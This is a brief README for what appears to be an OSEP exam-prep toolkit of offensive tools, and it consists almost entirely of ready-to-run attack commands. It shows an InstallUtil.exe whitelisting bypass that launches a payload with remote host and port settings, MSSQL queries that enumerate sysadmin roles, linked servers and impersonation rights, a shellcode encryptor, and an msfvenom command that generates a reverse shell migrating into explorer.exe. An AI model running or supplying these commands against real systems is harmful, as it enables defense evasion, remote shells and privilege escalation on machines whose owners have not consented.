# OSEP_code
OSEP_code


Project1.exe usage:\
&nbsp;&nbsp;  - C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /rhost=\<ip\> /rport=\<port\> /U C:\users\public\Project1.exe

ssql.exe usage:  ***Split the command with "---" ( 3 * "-" )*** \
&nbsp;&nbsp;  - C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /sqlServer=\<server\> /database=master /Cmds="EXEC sp_linkedservers;---SELECT SYSTEM_USER;---SELECT is_srvrolemember('sysadmin');---SELECT name FROM master..syslogins;---SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';---SELECT name FROM master..sysdatabases;" /U C:\users\public\ssql.exe

encrypt.exe usage:\
&nbsp;&nbsp;  - encrypt.exe /f=\<vba|csharp\> /code=0xfc,0xe9,... \
&nbsp;&nbsp;  - msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=443 EXITFUNC=thread PrependMigrate=true PrependMigrateProcess=explorer.exe -f csharp | tr -d '\n\r'

